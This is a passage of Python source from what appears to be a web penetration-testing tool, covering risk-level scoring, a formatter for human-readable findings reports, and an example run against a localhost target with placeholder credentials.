        # Determine risk level
        if risk_percentage >= 70:
            risk_level = "CRITICAL"
        elif risk_percentage >= 50:
            risk_level = "HIGH"
        elif risk_percentage >= 30:
            risk_level = "MEDIUM"
        else:
            risk_level = "LOW"
        
        # Count vulnerabilities by severity
        severity_counts = {}
        for severity in SeverityLevel:
            severity_counts[severity.value] = len([f for f in self.findings if f.severity == severity])
        
        return {
            "risk_level": risk_level,
            "risk_score": total_score,
            "risk_percentage": risk_percentage,
            "total_findings": len(self.findings),
            "severity_breakdown": severity_counts,
            "recommendations": [
                "Address all CRITICAL and HIGH severity vulnerabilities immediately",
                "Implement Web Application Firewall (WAF)",
                "Regular security testing and code reviews",
                "Security awareness training for development team"
            ]
        }
    
    def generate_report(self, report: SecurityTestReport) -> str:
        """Generate human-readable security report"""
        report_lines = [
            "=" * 80,
            "SECURITY PENETRATION TEST REPORT",
            "=" * 80,
            f"Target URL: {report.target_url}",
            f"Test Duration: {report.start_time} - {report.end_time}",
            f"Total Tests: {report.total_tests}",
            f"Vulnerabilities Found: {report.vulnerabilities_found}",
            "",
            "RISK ASSESSMENT",
            "-" * 40,
            f"Risk Level: {report.risk_assessment.get('risk_level', 'UNKNOWN')}",
            f"Risk Score: {report.risk_assessment.get('risk_score', 0)}/10",
            "",
            "SEVERITY BREAKDOWN",
            "-" * 40
        ]
        
        severity_breakdown = report.risk_assessment.get('severity_breakdown', {})
        for severity, count in severity_breakdown.items():
            if count > 0:
                report_lines.append(f"{severity.upper()}: {count}")
        
        report_lines.extend([
            "",
            "DETAILED FINDINGS",
            "-" * 40
        ])
        
        for i, finding in enumerate(report.findings, 1):
            report_lines.extend([
                f"{i}. {finding.title}",
                f"   Severity: {finding.severity.value.upper()}",
                f"   URL: {finding.affected_url}",
                f"   Description: {finding.description}",
                f"   Remediation: {finding.remediation}",
                ""
            ])
        
        report_lines.extend([
            "RECOMMENDATIONS",
            "-" * 40
        ])
        
        for rec in report.risk_assessment.get('recommendations', []):
            report_lines.append(f"• {rec}")
        
        report_lines.extend([
            "",
            "=" * 80,
            "End of Report",
            "=" * 80
        ])
        
        return "\n".join(report_lines)


# Example usage and testing
if __name__ == "__main__":
    import asyncio
    
    async def run_penetration_test():
        target_url = "http://localhost:3000"
        
        # Optional authentication
        auth_credentials = {
            "username": "testuser",
            "password": "testpassword"
        }
        
        async with PenetrationTestEngine(target_url, auth_credentials) as pen_tester:
            print("Starting comprehensive penetration test...")
            
            # Run comprehensive scan
            report = await pen_tester.run_comprehensive_scan()
            
            # Generate and print report
            report_text = pen_tester.generate_report(report)
            print(report_text)
            
            # Save report to file
            report_file = Path(f"pentest_report_{int(datetime.now().timestamp())}.txt")
            report_file.write_text(report_text)
            print(f"\nReport saved to: {report_file}")
            
            return report
    
    # Run the penetration test
    asyncio.run(run_penetration_test())